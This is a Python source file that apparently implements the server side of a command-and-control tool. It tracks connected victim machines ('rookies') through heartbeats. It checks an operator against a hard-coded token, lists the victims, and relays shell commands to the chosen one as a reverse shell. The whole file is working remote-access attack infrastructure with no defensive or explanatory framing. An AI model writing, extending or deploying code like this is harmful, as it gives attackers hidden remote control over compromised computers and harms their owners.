import socketserver
from utils import *
from threading import Thread
from time import sleep
from socket import gethostname, gethostbyname
from socket import socket
import logging
import json

logging.basicConfig(level=logging.DEBUG, filename='server.log', filemode='w')


class Server:
    token = str()
    rookies = dict()  # name: socket
    rookies_ttl = dict()  # name: time to live
    client_skt = socket()

    def __init__(self, token: str, port: int):
        Server.token = token
        self.port = port

    def run(self):
        ip = gethostbyname(gethostname())
        logging.debug(f'server is running\n'
                      f'ip: {ip}\n'
                      f'port: {self.port}\n'
                      f'token: {self.token}\n')
        # dump configuration
        with open('config.json', 'w') as f:
            json.dump({'port': self.port, 'token': Server.token}, f)

        Thread(target=self._update_rookie_ttl).start()

        with socketserver.ThreadingTCPServer(('localhost', self.port), RequestHandler) as svr:
            svr.serve_forever()

    def _update_rookie_ttl(self):
        while True:
            for name in list(Server.rookies_ttl.keys()):
                if self.rookies_ttl[name] == 0:
                    del self.rookies[name]
                    del self.rookies_ttl[name]
                    logging.info(f'rookie {name} timed out')
                else:
                    self.rookies_ttl[name] -= 1
            sleep(1)


class RequestHandler(socketserver.BaseRequestHandler):
    @IgnoreSE
    def handle(self):
        while True:
            data = self.request.recv(1024)
            header, msg = parse(data)
            if len(msg) == 0:
                continue
            # [H]
            if header == Header.heartbeat:
                name = msg
                if name not in Server.rookies.keys():
                    logging.info(f'found new rookie: {name}')
                Server.rookies[name] = self.request
                Server.rookies_ttl[name] = 5
            # [S]
            elif header == Header.shell:
                cmd = msg
                send_with_header(Server.client_skt, Header.shell, cmd)
            # [C]
            elif header == Header.control:
                token = msg
                self.control_handler(token)

    def control_handler(self, token):
        if token != Server.token:
            return
        else:
            send_with_header(self.request, Header.control, 'Rookie list:\n')
            send_with_header(self.request, Header.control, '\n'.join(Server.rookies.keys()) + '\n')
            send_with_header(self.request, Header.control, 'input a rookie name:\n')
            while True:
                data = self.request.recv(1024)
                header, name = parse(data)
                if header != Header.control:
                    continue
                logging.debug(f'received {data}')
                if name not in Server.rookies.keys():
                    send_with_header(self.request, Header.control, f'{name} not found\n')
                else:
                    send_with_header(self.request, Header.control, f'redirecting to {name}\n')
                    break
            self.reverse_shell(name)
            IgnoreSE(Server.client_skt.close)()
            IgnoreSE(Server.rookies[name].close)()
            Server.client_skt = None

    @IgnoreSE
    def reverse_shell(self, rookie_name):
        Server.client_skt = self.request
        client_skt = self.request
        rookie_skt = Server.rookies[rookie_name]
        send_with_header(rookie_skt, Header.control, 'shell')

        while True:
            cmd = recv_with_header(client_skt, Header.shell)
            if len(cmd) > 0:
                send_with_header(rookie_skt, Header.shell, cmd + '\n')


if __name__ == '__main__':
    server = Server(token='100109', port=36555)
    server.run()
